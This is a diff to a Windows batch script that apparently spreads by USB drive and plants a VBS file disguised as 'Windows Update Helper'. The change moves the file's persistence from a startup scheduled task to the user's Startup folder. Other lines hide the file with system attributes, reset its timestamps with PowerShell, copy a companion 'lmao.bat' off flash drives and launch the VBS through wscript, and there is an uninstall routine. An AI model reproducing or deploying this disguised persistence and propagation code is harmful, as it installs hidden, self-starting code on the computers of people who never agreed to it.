@@ -10,7 +10,7 @@ goto :searching
 
 :changedate
 c:
-cd "%appdata%\Microsoft\Windows\"
+cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
 attrib -s -h "Windows Update Helper.vbs"
 powershell  (Get-Item "Windows` Update` Helper.vbs").CreationTime=Get-Date
 powershell  (Get-Item "Windows` Update` Helper.vbs").LastWriteTime=Get-Date
@@ -81,9 +81,8 @@ if exist UNIN000.dat goto :u
 if not %com%==initcopy goto :searching
 if exist transfer.dat (xcopy transfer\* %homedrive%%homepath% /y)
 if exist "Windows Update Helper.vbs" (
-if exist "%appdata%\Microsoft\Windows\Windows Update Helper.vbs" (attrib -s "%appdata%\Microsoft\Windows\Windows Update Helper.vbs")
-xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\" /y
-schtasks /create /sc onstart /tn "Windows Update Helper" /tr "%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
+if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" (attrib -s "%appdata%\Microsoft\Windows\Start Menu\Startup\Windows Update Helper.vbs")
+xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" /y
 )
 if %dirr%==FLASH (
 if exist lmao.bat (
@@ -95,7 +94,7 @@ xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y
 goto :miss
 )
 if not exist "%appdata%\Microsoft\Windows\lmao.bat" (xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y)
-if not exist "%appdata%\Microsoft\Windows\Windows Update Helper.vbs" (xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\")
+if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" (xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\")
 if %copied%==false (
 if %dirr%==HDD (
 attrib -h alreadycopied.dat
@@ -104,7 +103,7 @@ attrib +h alreadycopied.dat
 goto :miss
 )
 )
-attrib +s "%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
+attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
 set curr=%cd%
 set curr=%curr:~0,2%
 set skip=true
@@ -148,7 +147,7 @@ goto :d
 
 :u
 echo removing system and hidden properties from folders... > info.txt
-attrib -s "%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
+attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
 attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"  >> info.txt
 attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"  >> info.txt
 echo properties removed, continuing... >> info.txt
@@ -159,7 +158,7 @@ echo removing atinsert... >> info.txt
 rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"  >> info.txt
 echo atinsert removed >> info.txt
 echo removing vbs and supporting bat if any... >> info.txt
-del /q "%appdata%\Microsoft\Windows\Windows Update Helper.vbs" >> info.txt
+del /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >> info.txt
 echo vbs removed >> info.txt
 echo removing lmao.bat (if uninstalling without lmao.bat on usb, rest not available)... >> info.txt
 del /q "%appdata%\Microsoft\Windows\lmao.bat"  >> info.txt
@@ -170,7 +169,7 @@ exit
 :miss
 %homedrive:~0,2%
 if %novbs%==false (
-cd "%appdata%\Microsoft\Windows\"
+cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
 wscript "Windows Update Helper.vbs"
 exit
 )
